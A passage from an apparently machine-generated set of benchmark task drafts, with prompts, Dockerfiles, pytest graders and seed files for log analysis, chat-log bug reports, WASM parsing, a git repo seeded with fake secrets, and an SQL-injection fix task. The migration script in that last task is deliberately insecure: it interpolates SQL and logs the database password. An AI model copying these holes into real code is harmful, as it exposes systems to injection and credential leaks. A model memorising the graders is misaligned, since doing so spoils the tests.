\""SEC-2345: Add SQL injection protection\""\n\n# Commit 4: Database password exposed (dangerous)\ncat > database.py << 'EOF'\nimport psycopg2\n\ndef connect():\n    conn = psycopg2.connect(\n        host=\""localhost\"",\n        database=\""production\"",\n        user=\""admin\"",\n        password=\""SuperSecret123!\""\n    )\n    return conn\nEOF\ngit add database.py\ngit commit -m \""Add database connection module\""\n\n# Commit 5: Security fix with API token in diff (dangerous)\ncat > api_client.py << 'EOF'\nimport requests\n\nclass APIClient:\n    def __init__(self):\n        self.base_url = \""https://api.example.com\""\n        self.headers = {\n            \""Authorization\"": \""Bearer sk-proj-abcd1234efgh5678ijkl9012mnop3456qrst7890uvwx\""\n        }\n    \n    def get_data(self, endpoint):\n        return requests.get(f\""{self.base_url}/{endpoint}\"", headers=self.headers)\nEOF\ngit add api_client.py\ngit commit -m \""SEC-3456: Add rate limiting to API client\""\n\n# Commit 6: Security fix (safe)\ncat > session_manager.py << 'EOF'\nimport secrets\nimport time\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n    \n    def create_session(self, user_id):\n        session_id = secrets.token_urlsafe(32)\n        self.sessions[session_id] = {\n            'user_id': user_id,\n            'created_at': time.time(),\n            'expires_at': time.time() + 3600\n        }\n        return session_id\n    \n    def validate_session(self, session_id):\n        if session_id not in self.sessions:\n            return False\n        session = self.sessions[session_id]\n        if time.time() > session['expires_at']:\n            del self.sessions[session_id]\n            return False\n        return True\nEOF\ngit add session_manager.py\ngit commit -m \""SEC-4567: Implement secure session management with expiration\""\n\n# Commit 7: Private key exposed (dangerous)\ncat > ssh_key.txt << 'EOF'\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAw7Nz8Ld1ZgNKr3xPZjgFQ8hKsZnDpvRLsVKUxqKRjztPdBfZ\nfake-key-content-for-testing-purposes-only\n-----END RSA PRIVATE KEY-----\nEOF\ngit add ssh_key.txt\ngit commit -m \""Add deployment key\""\n\n# Commit 8: Security fix (safe)\ncat > cors_config.py << 'EOF'\nALLOWED_ORIGINS = [\n    \""https://app.example.com\"",\n    \""https://admin.example.com\""\n]\n\ndef validate_origin(origin):\n    return origin in ALLOWED_ORIGINS\nEOF\ngit add cors_config.py\ngit commit -m \""SEC-5678: Implement strict CORS policy\""\n\n# Return to root\ncd /""}",2025-07-22T11:56:43.749594+00:00,2025-07-22T20:33:20.253794+00:00
draft_dp_1e7d0b51,medium,draft_dp_1e7d0b51,data-processing,"The log analyzer is broken - it's not generating incident reports. Need it to analyze the logs in /app/logs/, identify correlated errors using TF-IDF pattern matching, and output incident reports to /app/incidents/.",data-processing,python|pattern-recognition|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install scikit-learn pandas python-dateutil

RUN mkdir -p /app/logs /app/incidents /app/known_patterns

COPY log_analyzer.py /app/
COPY known_patterns.json /app/known_patterns/
COPY logs/ /app/logs/

CMD [""python"", ""log_analyzer.py""]","import os
import json
import subprocess

def test_incident_reports_generated():
    """"""Test that incident reports are generated in the correct location with required fields.""""""
    # Run the log analyzer
    result = subprocess.run(['python', '/app/log_analyzer.py'], capture_output=True, text=True)
    
    # Check that incidents directory has files
    incidents_dir = '/app/incidents'
    assert os.path.exists(incidents_dir), ""Incidents directory should exist""
    
    incident_files = [f for f in os.listdir(incidents_dir) if f.endswith('.json')]
    assert len(incident_files) >= 2, ""Should generate at least 2 incident reports""
    
    # Check first incident has required fields
    with open(os.path.join(incidents_dir, incident_files[0]), 'r') as f:
        incident = json.load(f)
    
    required_fields = ['incident_id', 'severity', 'affected_services', 'timeline', 'root_cause_hypothesis', 'evidence']
    for field in required_fields:
        assert field in incident, f""Incident report missing required field: {field}""
    
    assert isinstance(incident['affected_services'], list), ""affected_services should be a list""
    assert isinstance(incident['timeline'], list), ""timeline should be a list""

def test_incident_classification_accuracy():
    """"""Test that incidents are correctly classified based on TF-IDF pattern matching.""""""
    incidents_dir = '/app/incidents'
    
    # Find the database/memory incident
    found_memory_incident = False
    found_auth_incident = False
    
    for filename in os.listdir(incidents_dir):
        if filename.endswith('.json'):
            with open(os.path.join(incidents_dir, filename), 'r') as f:
                incident = json.load(f)
                
                # Check if this is the memory exhaustion incident
                if 'memory' in incident.get('root_cause_hypothesis', '').lower() or \
                   'Resource Exhaustion' in incident.get('incident_type', ''):
                    found_memory_incident = True
                    assert incident['severity'] in ['high', 'critical'], ""Memory exhaustion should be high/critical severity""
                
                # Check if this is the authentication failure incident  
                if 'auth' in incident.get('root_cause_hypothesis', '').lower() or \
                   'Security Issue' in incident.get('incident_type', ''):
                    found_auth_incident = True
                    assert incident['severity'] == 'medium', ""Auth failures should be medium severity""
    
    assert found_memory_incident, ""Should identify memory exhaustion incident from database logs""
    assert found_auth_incident, ""Should identify authentication failure incident""","{""test_incident_reports_generated"": 0.6, ""test_incident_classification_accuracy"": 0.4}","{""log_analyzer.py"": ""#!/usr/bin/env python3\nimport os\nimport json\nimport re\nfrom datetime import datetime\nfrom collections import defaultdict\nimport pandas as pd\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\n\n\nclass LogAnalyzer:\n    def __init__(self, log_dir=\""/app/logs\"", patterns_file=\""/app/known_patterns/known_patterns.json\""):\n        self.log_dir = log_dir\n        self.patterns_file = patterns_file\n        self.logs = []\n        self.known_patterns = {}\n        self.load_known_patterns()\n        \n    def load_known_patterns(self):\n        if os.path.exists(self.patterns_file):\n            with open(self.patterns_file, 'r') as f:\n                self.known_patterns = json.load(f)\n    \n    def parse_logs(self):\n        for filename in os.listdir(self.log_dir):\n            if filename.endswith('.log'):\n                filepath = os.path.join(self.log_dir, filename)\n                service = filename.replace('.log', '')\n                \n                with open(filepath, 'r') as f:\n                    for line in f:\n                        if 'ERROR' in line or 'CRITICAL' in line:\n                            log_entry = self.parse_log_line(line, service)\n                            if log_entry:\n                                self.logs.append(log_entry)\n    \n    def parse_log_line(self, line, service):\n        # Basic parsing - needs to be implemented\n        # Should extract timestamp, level, message\n        return None\n    \n    def correlate_events(self):\n        # Group events by time window\n        # This is where the correlation logic should go\n        pass\n    \n    def classify_incidents(self):\n        # Use TF-IDF to match against known patterns\n        # Not implemented yet\n        pass\n    \n    def generate_reports(self):\n        # Generate incident reports\n        # Should create JSON files in /app/incidents/\n        print(\""Log analysis complete. No incidents generated.\"")\n        \n\nif __name__ == \""__main__\"":\n    analyzer = LogAnalyzer()\n    analyzer.parse_logs()\n    analyzer.correlate_events()\n    analyzer.classify_incidents()\n    analyzer.generate_reports()"", ""known_patterns.json"": ""{\n  \""database_connection_failure\"": {\n    \""patterns\"": [\n      \""connection refused\"",\n      \""database unavailable\"",\n      \""cannot connect to database\"",\n      \""connection timeout\""\n    ],\n    \""severity\"": \""high\"",\n    \""type\"": \""Database Connectivity Issue\""\n  },\n  \""memory_exhaustion\"": {\n    \""patterns\"": [\n      \""out of memory\"",\n      \""memory exhausted\"",\n      \""cannot allocate memory\"",\n      \""heap space\""\n    ],\n    \""severity\"": \""critical\"",\n    \""type\"": \""Resource Exhaustion\""\n  },\n  \""authentication_failure\"": {\n    \""patterns\"": [\n      \""authentication failed\"",\n      \""invalid credentials\"",\n      \""unauthorized access\"",\n      \""login failed\""\n    ],\n    \""severity\"": \""medium\"",\n    \""type\"": \""Security Issue\""\n  }\n}"", ""logs/webserver.log"": ""2024-01-15 10:23:15 INFO [WebServer] Request received from 192.168.1.100\n2024-01-15 10:23:16 INFO [WebServer] Processing request /api/users\n2024-01-15 10:23:17 ERROR [WebServer] Database connection refused: Cannot connect to database server at localhost:5432\n2024-01-15 10:23:18 ERROR [WebServer] Failed to fetch user data\n2024-01-15 10:23:19 INFO [WebServer] Attempting database reconnection\n2024-01-15 10:23:20 ERROR [WebServer] Connection timeout after 1000ms\n2024-01-15 10:23:21 CRITICAL [WebServer] Service degraded - falling back to cache\n2024-01-15 10:25:45 INFO [WebServer] Request received from 192.168.1.101\n2024-01-15 10:25:46 ERROR [WebServer] Authentication failed for user admin\n2024-01-15 10:25:47 WARN [WebServer] Multiple login failures detected\n2024-01-15 10:25:48 ERROR [WebServer] Invalid credentials provided\n2024-01-15 10:25:49 INFO [WebServer] Account locked after 3 failed attempts"", ""logs/database.log"": ""2024-01-15 10:23:14 INFO [PostgreSQL] Server started on port 5432\n2024-01-15 10:23:15 INFO [PostgreSQL] Accepting connections\n2024-01-15 10:23:16 ERROR [PostgreSQL] Out of memory: Failed to allocate 1048576 bytes\n2024-01-15 10:23:16 CRITICAL [PostgreSQL] Memory exhausted while processing query\n2024-01-15 10:23:17 ERROR [PostgreSQL] Cannot allocate memory for new connection\n2024-01-15 10:23:17 INFO [PostgreSQL] Shutting down due to resource constraints\n2024-01-15 10:23:18 INFO [PostgreSQL] Server stopped\n2024-01-15 10:25:30 INFO [PostgreSQL] Server restarted on port 5432\n2024-01-15 10:25:31 INFO [PostgreSQL] Recovery mode initiated\n2024-01-15 10:25:32 INFO [PostgreSQL] Database restored from checkpoint"", ""logs/application.log"": ""2024-01-15 10:23:10 INFO [AppServer] Application started successfully\n2024-01-15 10:23:11 INFO [AppServer] Loading configuration from config.json\n2024-01-15 10:23:12 INFO [AppServer] Initializing database connections\n2024-01-15 10:23:17 ERROR [AppServer] Database unavailable - connection refused\n2024-01-15 10:23:18 ERROR [AppServer] Failed to initialize user service\n2024-01-15 10:23:19 WARN [AppServer] Retrying database connection (attempt 1/3)\n2024-01-15 10:23:20 ERROR [AppServer] Database unavailable - connection refused\n2024-01-15 10:23:21 WARN [AppServer] Retrying database connection (attempt 2/3)\n2024-01-15 10:23:22 ERROR [AppServer] Database unavailable - connection refused\n2024-01-15 10:23:23 CRITICAL [AppServer] All database connection attempts failed\n2024-01-15 10:23:24 INFO [AppServer] Entering degraded mode\n2024-01-15 10:25:46 ERROR [AppServer] Unauthorized access attempt from IP 192.168.1.101\n2024-01-15 10:25:47 ERROR [AppServer] Login failed for user: admin\n2024-01-15 10:25:48 WARN [AppServer] Potential brute force attack detected""}",2025-07-22T15:08:03.514745+00:00,2025-07-22T15:08:03.547771+00:00
draft_dp_fe196bad,hard,draft_dp_fe196bad,data-processing,The support team is drowning in chat logs. Build a script that uses TF-IDF to extract technical issues from these conversations and generate structured bug reports in JSON format.,data-processing,python|text-processing|data-extraction,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy data files
COPY chat_logs.json /app/data/chat_logs.json
COPY tech_terms.json /app/data/tech_terms.json

# Create output directory
RUN mkdir -p /app/output

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_bug_reports_generated():
    """"""Test that bug reports are generated from chat logs.""""""
    # Check if the output file exists
    output_file = ""/app/output/bug_reports.json""
    assert os.path.exists(output_file), f""Bug reports file not found at {output_file}""
    
    # Load and validate the bug reports
    with open(output_file, 'r') as f:
        bug_reports = json.load(f)
    
    # Should have extracted issues from the chat logs
    assert len(bug_reports) >= 5, f""Expected at least 5 bug reports, found {len(bug_reports)}""
    
    # Check that each bug report has required fields
    required_fields = [""title"", ""description"", ""severity"", ""affected_component""]
    for i, report in enumerate(bug_reports):
        for field in required_fields:
            assert field in report, f""Bug report {i} missing required field: {field}""
            assert report[field], f""Bug report {i} has empty {field}""

def test_severity_classification():
    """"""Test that issues are properly classified by severity.""""""
    output_file = ""/app/output/bug_reports.json""
    
    with open(output_file, 'r') as f:
        bug_reports = json.load(f)
    
    # Check that we have different severity levels
    severities = {report.get(""severity"") for report in bug_reports}
    assert len(severities) >= 2, f""Expected multiple severity levels, found: {severities}""
    
    # Check that critical issues were identified (API and search issues should be critical/high)
    high_severity_count = sum(1 for r in bug_reports if r.get(""severity"") in [""critical"", ""high""])
    assert high_severity_count >= 2, f""Expected at least 2 high/critical issues, found {high_severity_count}""","{""test_bug_reports_generated"": 0.6, ""test_severity_classification"": 0.4}","{""chat_logs.json"": ""[\n  {\n    \""chat_id\"": \""CH001\"",\n    \""timestamp\"": \""2024-01-15 10:30:00\"",\n    \""customer\"": \""john.doe@email.com\"",\n    \""messages\"": [\n      {\""sender\"": \""customer\"", \""text\"": \""Hi, I'm having trouble with the login page\""},\n      {\""sender\"": \""support\"", \""text\"": \""Hello! I'd be happy to help. What specific issue are you experiencing?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""When I try to log in, I get a 'Connection timeout' error after about 30 seconds\""},\n      {\""sender\"": \""support\"", \""text\"": \""I see. Are you using the web app or mobile app?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Web app, Chrome browser version 120. This started happening yesterday\""},\n      {\""sender\"": \""support\"", \""text\"": \""Have you tried clearing your browser cache?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Yes, I tried that. Also tried Firefox and Safari - same issue\""},\n      {\""sender\"": \""support\"", \""text\"": \""Let me check our system status. What's your account email?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""john.doe@email.com - I can access other parts of the site, just not login\""},\n      {\""sender\"": \""support\"", \""text\"": \""I'll escalate this to our technical team. Reference number: TK-2024-001\""}\n    ]\n  },\n  {\n    \""chat_id\"": \""CH002\"",\n    \""timestamp\"": \""2024-01-15 11:45:00\"",\n    \""customer\"": \""sarah.smith@company.com\"",\n    \""messages\"": [\n      {\""sender\"": \""customer\"", \""text\"": \""The dashboard is completely broken!!\""},\n      {\""sender\"": \""support\"", \""text\"": \""I'm sorry to hear that. Can you describe what you're seeing?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""All the graphs show 'NaN' instead of numbers. Started after the update last night\""},\n      {\""sender\"": \""support\"", \""text\"": \""Which dashboard are you referring to? Sales, Analytics, or Admin?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Analytics dashboard. The date range selector also doesn't work - stuck on 'Invalid Date'\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Console shows: TypeError: Cannot read property 'format' of undefined at line 234\""},\n      {\""sender\"": \""support\"", \""text\"": \""Thank you for that error message. Are you able to see data in other sections?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Reports section works fine, just the main analytics dashboard is affected\""},\n      {\""sender\"": \""support\"", \""text\"": \""I've documented this issue. Our dev team will investigate immediately.\""}\n    ]\n  },\n  {\n    \""chat_id\"": \""CH003\"",\n    \""timestamp\"": \""2024-01-15 14:20:00\"",\n    \""customer\"": \""mike.jones@startup.io\"",\n    \""messages\"": [\n      {\""sender\"": \""customer\"", \""text\"": \""API endpoints returning 500 errors randomly\""},\n      {\""sender\"": \""support\"", \""text\"": \""Which endpoints are you experiencing issues with?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""/api/v2/users and /api/v2/products both fail about 50% of the time\""},\n      {\""sender\"": \""support\"", \""text\"": \""Are you getting any specific error messages?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Yes: 'Internal Server Error: Database connection pool exhausted'\""},\n      {\""sender\"": \""customer\"", \""text\"": \""We're making about 100 requests per minute, well under the 500/min limit\""},\n      {\""sender\"": \""support\"", \""text\"": \""That's concerning. How long has this been happening?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Started 2 hours ago. Our integration tests are failing because of this\""},\n      {\""sender\"": \""support\"", \""text\"": \""I'm escalating this as high priority. Can you share your API key prefix?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Starts with 'pk_live_abc123'. This is blocking our production deployment\""}\n    ]\n  },\n  {\n    \""chat_id\"": \""CH004\"",\n    \""timestamp\"": \""2024-01-15 15:00:00\"",\n    \""customer\"": \""lisa.chen@design.co\"",\n    \""messages\"": [\n      {\""sender\"": \""customer\"", \""text\"": \""File upload feature broken on the media library\""},\n      {\""sender\"": \""support\"", \""text\"": \""What happens when you try to upload a file?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Progress bar gets to 100% then shows 'Upload failed: undefined'\""},\n      {\""sender\"": \""support\"", \""text\"": \""What type and size of files are you uploading?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""JPEGs and PNGs, all under 5MB. Worked fine last week\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Network tab shows 413 error - 'Request Entity Too Large' but files are small!\""},\n      {\""sender\"": \""support\"", \""text\"": \""That's unusual for small files. Are you on the Pro or Enterprise plan?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Pro plan. Even 100KB images fail. Affects all users in our team\""},\n      {\""sender\"": \""support\"", \""text\"": \""This appears to be a configuration issue. I'll have our team investigate.\""}\n    ]\n  },\n  {\n    \""chat_id\"": \""CH005\"",\n    \""timestamp\"": \""2024-01-15 16:30:00\"",\n    \""customer\"": \""alex.wong@tech.net\"",\n    \""messages\"": [\n      {\""sender\"": \""customer\"", \""text\"": \""Search function returns no results for any query\""},\n      {\""sender\"": \""support\"", \""text\"": \""Is this affecting all search types or specific ones?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""All searches - products, users, orders. Just shows 'No results found'\""},\n      {\""sender\"": \""support\"", \""text\"": \""When did you first notice this issue?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""This morning. ElasticSearch health check endpoint returns 'red' status\""},\n      {\""sender\"": \""customer\"", \""text\"": \""Also seeing 'cluster_block_exception' in the logs\""},\n      {\""sender\"": \""support\"", \""text\"": \""That indicates a serious search infrastructure issue. Which region are you in?\""},\n      {\""sender\"": \""customer\"", \""text\"": \""US-West-2. This is critical - customers can't find any products!\""},\n      {\""sender\"": \""support\"", \""text\"": \""Escalating immediately to our infrastructure team. Case #ES-2024-005\""}\n    ]\n  }\n]"", ""tech_terms.json"": ""{\n  \""error_patterns\"": {\n    \""authentication\"": [\""login\"", \""auth\"", \""password\"", \""credential\"", \""sign in\"", \""access denied\"", \""unauthorized\""],\n    \""performance\"": [\""slow\"", \""timeout\"", \""lag\"", \""delay\"", \""freeze\"", \""unresponsive\"", \""loading\""],\n    \""data\"": [\""NaN\"", \""null\"", \""undefined\"", \""missing\"", \""corrupt\"", \""invalid\"", \""format\""],\n    \""api\"": [\""endpoint\"", \""request\"", \""response\"", \""status code\"", \""REST\"", \""webhook\"", \""integration\""],\n    \""database\"": [\""connection\"", \""query\"", \""pool\"", \""transaction\"", \""deadlock\"", \""index\""],\n    \""ui\"": [\""display\"", \""render\"", \""layout\"", \""button\"", \""form\"", \""dashboard\"", \""graph\"", \""chart\""],\n    \""infrastructure\"": [\""server\"", \""cluster\"", \""node\"", \""service\"", \""deployment\"", \""scaling\""],\n    \""file\"": [\""upload\"", \""download\"", \""storage\"", \""size\"", \""format\"", \""permission\""]\n  },\n  \""severity_indicators\"": {\n    \""critical\"": [\""production\"", \""blocking\"", \""urgent\"", \""down\"", \""critical\"", \""emergency\"", \""all users\""],\n    \""high\"": [\""broken\"", \""failed\"", \""error\"", \""cannot\"", \""unable\"", \""important\""],\n    \""medium\"": [\""issue\"", \""problem\"", \""bug\"", \""sometimes\"", \""intermittent\""],\n    \""low\"": [\""minor\"", \""cosmetic\"", \""occasionally\"", \""rare\""]\n  },\n  \""components\"": {\n    \""Frontend\"": [\""UI\"", \""dashboard\"", \""page\"", \""browser\"", \""client\"", \""web app\""],\n    \""Backend\"": [\""API\"", \""server\"", \""endpoint\"", \""service\"", \""logic\""],\n    \""Database\"": [\""data\"", \""query\"", \""storage\"", \""connection\"", \""pool\""],\n    \""Infrastructure\"": [\""deployment\"", \""cluster\"", \""network\"", \""scaling\""],\n    \""Authentication\"": [\""login\"", \""auth\"", \""user\"", \""permission\"", \""access\""],\n    \""Search\"": [\""search\"", \""elasticsearch\"", \""query\"", \""index\"", \""results\""],\n    \""Media\"": [\""file\"", \""upload\"", \""image\"", \""media\"", \""storage\""]\n  }\n}""}",2025-07-22T12:01:16.900790+00:00,2025-07-22T20:33:45.436200+00:00
draft_dp_537e5bb5,hard,draft_dp_537e5bb5,data-processing,"I need to parse these WASM modules and extract their function signatures, imports/exports, and custom sections. The output should show the module structure in a readable format.",data-processing,binary-processing|python|data-extraction,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    wabt \
    python3-pip \
    python3-pytest \
    bsdmainutils \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy WAT source files
COPY simple_math.wat /app/
COPY complex_module.wat /app/
COPY custom_sections.wat /app/

# Convert WAT to WASM
RUN wat2wasm simple_math.wat -o simple_math.wasm
RUN wat2wasm complex_module.wat -o complex_module.wasm
RUN wat2wasm custom_sections.wat -o custom_sections.wasm

# Create a malformed WASM file for error testing
RUN echo -ne '\x00\x61\x73\x6d\x01\x00\x00\x00\x01\x05\x01' > malformed.wasm

# Create a WASM file with custom sections by modifying the simple one
RUN cp custom_sections.wasm custom_with_sections.wasm && \
    echo -ne '\x00\x04name\x02\x04main' >> custom_with_sections.wasm

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_parser_script_exists_and_parses_simple_module():
    """"""Test that WASM parser exists and correctly parses simple_math.wasm""""""
    # Check if parser was created
    assert os.path.exists('/app/wasm_parser.py'), ""WASM parser script not found""
    
    # Run parser on simple module
    result = subprocess.run(
        ['python3', '/app/wasm_parser.py', '/app/simple_math.wasm'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Parser failed with: {result.stderr}""
    output = result.stdout
    
    # Verify basic structure is parsed
    assert 'Exports:' in output, ""Export section not found in output""
    assert 'add' in output, ""Export 'add' not found""
    assert 'multiply' in output, ""Export 'multiply' not found""
    assert 'Function signatures:' in output or 'Type section:' in output, ""Function signatures not shown""

def test_complex_module_imports_and_tables():
    """"""Test parsing of complex module with imports, memory, and tables""""""
    result = subprocess.run(
        ['python3', '/app/wasm_parser.py', '/app/complex_module.wasm'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Parser failed on complex module""
    output = result.stdout
    
    # Check imports parsing
    assert 'Imports:' in output, ""Import section not found""
    assert 'env' in output, ""Import module 'env' not found""
    assert 'log' in output, ""Imported function 'log' not found""
    
    # Check memory and table info
    assert 'memory' in output.lower() or 'Memory' in output, ""Memory declaration not found""
    assert 'table' in output.lower() or 'Table' in output, ""Table declaration not found""

def test_custom_sections_parsing():
    """"""Test that custom sections are properly extracted""""""
    result = subprocess.run(
        ['python3', '/app/wasm_parser.py', '/app/custom_with_sections.wasm'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Parser failed on custom sections module""
    output = result.stdout
    
    # Check custom sections are found
    assert 'Custom sections:' in output or 'custom' in output.lower(), ""Custom sections not parsed""
    assert 'name' in output, ""Expected custom section 'name' not found""","{""test_parser_script_exists_and_parses_simple_module"": 0.4, ""test_complex_module_imports_and_tables"": 0.3, ""test_custom_sections_parsing"": 0.3}","{""complex_module.wat"": ""(module\n  (import \""env\"" \""log\"" (func $log (param i32)))\n  (import \""env\"" \""memory\"" (memory 1))\n  \n  (type $binary_op (func (param i32 i32) (result i32)))\n  \n  (func $internal_calc (type $binary_op)\n    local.get 0\n    local.get 1\n    i32.add\n    i32.const 2\n    i32.mul)\n  \n  (func $process (param $input i32) (result i32)\n    local.get $input\n    call $log\n    local.get $input\n    i32.const 10\n    call $internal_calc)\n  \n  (table 2 funcref)\n  (elem (i32.const 0) $internal_calc $process)\n  \n  (export \""process\"" (func $process))\n  (export \""table\"" (table 0))\n  (export \""memory\"" (memory 0))\n)"", ""custom_sections.wat"": ""(module\n  (func $main (result i32)\n    i32.const 42)\n  \n  (export \""main\"" (func $main))\n)"", ""simple_math.wat"": ""(module\n  (func $add (param $a i32) (param $b i32) (result i32)\n    local.get $a\n    local.get $b\n    i32.add)\n  \n  (func $multiply (param $x i32) (param $y i32) (result i32)\n    local.get $x\n    local.get $y\n    i32.mul)\n  \n  (export \""add\"" (func $add))\n  (export \""multiply\"" (func $multiply))\n)""}",2025-07-22T11:54:09.549701+00:00,2025-07-22T12:03:34.024771+00:00
draft_dp_bb687875,medium,draft_dp_bb687875,security,Security audit flagged SQL injection risks in our database migration scripts. Need to fix the vulnerable queries and secure the migration pipeline.,security,python|security|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install PostgreSQL client and Python PostgreSQL adapter
RUN apt-get update && apt-get install -y \
    postgresql-client \
    && rm -rf /var/lib/apt/lists/*

RUN pip install psycopg2-binary python-dotenv

# Copy migration files
COPY migrate.py /app/
COPY V1__create_users_table.sql /app/
COPY V2__add_user_roles.sql /app/
COPY V3__dynamic_table_creation.sql /app/
COPY .env /app/

# Make migrate script executable
RUN chmod +x migrate.py

# Set up a simple PostgreSQL for testing (in production this would be external)
RUN apt-get update && apt-get install -y postgresql postgresql-contrib && \
    rm -rf /var/lib/apt/lists/*

# Initialize PostgreSQL
USER postgres
RUN /etc/init.d/postgresql start && \
    psql --command ""ALTER USER postgres PASSWORD 'postgres123';"" && \
    createdb -O postgres myapp

USER root

# Create startup script
RUN echo '#!/bin/bash\nservice postgresql start\nsleep 2\nexec ""$@""' > /start.sh && \
    chmod +x /start.sh

ENTRYPOINT [""/start.sh""]
CMD [""/bin/bash""]","import os
import subprocess
import re

def test_sql_injection_fixed():
    """"""Test that SQL injection vulnerabilities have been fixed in migrate.py""""""
    # Check that migrate.py exists and has been modified
    assert os.path.exists('/app/migrate.py'), ""migrate.py not found""
    
    with open('/app/migrate.py', 'r') as f:
        content = f.read()
    
    # Check for parameterized queries instead of string formatting
    vulnerable_patterns = [
        r""f\""SELECT.*WHERE.*=.*'{.*}'\"""",  # f-string SQL injection
        r""\""INSERT.*VALUES.*\('{.*}'\)\"""",  # Direct string interpolation
        r""sql\s*=\s*f\"".*{.*}.*\"""",  # Any f-string SQL construction
        r""\.format\(.*\).*SELECT|INSERT|UPDATE|DELETE"",  # .format() in SQL
        r""CREATE TABLE.*{.*}""  # Dynamic table creation vulnerability
    ]
    
    for pattern in vulnerable_patterns:
        assert not re.search(pattern, content, re.IGNORECASE), \
            f""Found vulnerable SQL pattern: {pattern}""
    
    # Check for proper parameterized query usage
    assert ""cursor.execute("" in content, ""No cursor.execute found""
    assert ""%s"" in content or ""?"" in content or ""cursor.execute(sql, "" in content, \
        ""No parameterized query markers found""

def test_credentials_secured():
    """"""Test that database credentials are properly secured""""""
    # Check that .env file is not exposing raw credentials
    if os.path.exists('/app/.env'):
        with open('/app/.env', 'r') as f:
            env_content = f.read()
        # Basic check - in real scenario would check for encryption/vault usage
        assert 'postgres123' not in env_content or 'DB_PASSWORD=' not in env_content, \
            ""Plain text password found in .env file""
    
    # Check migrate.py doesn't log credentials
    if os.path.exists('/app/migrate.py'):
        with open('/app/migrate.py', 'r') as f:
            migrate_content = f.read()
        
        # Check for credential logging
        assert not re.search(r'print.*password', migrate_content, re.IGNORECASE), \
            ""Password being logged""
        assert not re.search(r'print.*conn_string', migrate_content, re.IGNORECASE), \
            ""Connection string with credentials being logged""
        
        # Check credentials aren't hardcoded
        assert 'postgres123' not in migrate_content, \
            ""Hardcoded password found in migrate.py""","{""test_sql_injection_fixed"": 0.6, ""test_credentials_secured"": 0.4}","{""V1__create_users_table.sql"": ""-- Migration V1: Create users table\nCREATE TABLE IF NOT EXISTS users (\n    id SERIAL PRIMARY KEY,\n    username VARCHAR(100) NOT NULL UNIQUE,\n    email VARCHAR(255) NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Insert initial admin user\nINSERT INTO users (username, email) VALUES ('admin', 'admin@example.com');"", "".env"": ""DB_HOST=localhost\nDB_PORT=5432\nDB_NAME=myapp\nDB_USER=postgres\nDB_PASSWORD=postgres123\nDYNAMIC_TABLE_NAME=user_data\nTABLE_SUFFIX=_prod"", ""V3__dynamic_table_creation.sql"": ""-- Migration V3: Dynamic table creation based on environment\n-- This script contains SQL injection vulnerability"", ""V2__add_user_roles.sql"": ""-- Migration V2: Add user roles\nCREATE TABLE IF NOT EXISTS roles (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(50) NOT NULL UNIQUE\n);\n\nALTER TABLE users ADD COLUMN role_id INTEGER REFERENCES roles(id);\n\n-- Insert default roles\nINSERT INTO roles (name) VALUES ('admin'), ('user'), ('guest');"", ""migrate.py"": ""#!/usr/bin/env python3\nimport os\nimport psycopg2\nimport glob\n\ndef get_db_connection():\n    # Vulnerable: credentials exposed in code\n    host = os.getenv('DB_HOST', 'localhost')\n    port = os.getenv('DB_PORT', '5432')\n    db = os.getenv('DB_NAME', 'myapp')\n    user = os.getenv('DB_USER', 'postgres')\n    password = os.getenv('DB_PASSWORD', 'postgres123')\n    \n    conn_string = f\""host={host} port={port} dbname={db} user={user} password={password}\""\n    print(f\""Connecting to database: {conn_string}\"")  # Vulnerable: logging credentials\n    return psycopg2.connect(conn_string)\n\ndef run_migration(conn, filepath, table_suffix=None):\n    with open(filepath, 'r') as f:\n        sql = f.read()\n    \n    # Vulnerable: SQL injection through environment variable\n    if table_suffix:\n        sql = sql.replace('${TABLE_SUFFIX}', table_suffix)\n    \n    # Vulnerable: direct string interpolation\n    if 'dynamic_table' in filepath:\n        table_name = os.getenv('DYNAMIC_TABLE_NAME', 'default_table')\n        sql = f\""\""\""\n        CREATE TABLE IF NOT EXISTS {table_name} (\n            id SERIAL PRIMARY KEY,\n            data TEXT\n        );\n        \""\""\""\n    \n    cursor = conn.cursor()\n    cursor.execute(sql)\n    conn.commit()\n    print(f\""Executed migration: {filepath}\"")\n\ndef main():\n    conn = get_db_connection()\n    \n    # Get all SQL files in order\n    migrations = sorted(glob.glob('V*.sql'))\n    \n    # Track applied migrations (vulnerable implementation)\n    cursor = conn.cursor()\n    cursor.execute(\""\""\""\n        CREATE TABLE IF NOT EXISTS migrations (\n            filename VARCHAR(255) PRIMARY KEY,\n            applied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n        )\n    \""\""\"")\n    conn.commit()\n  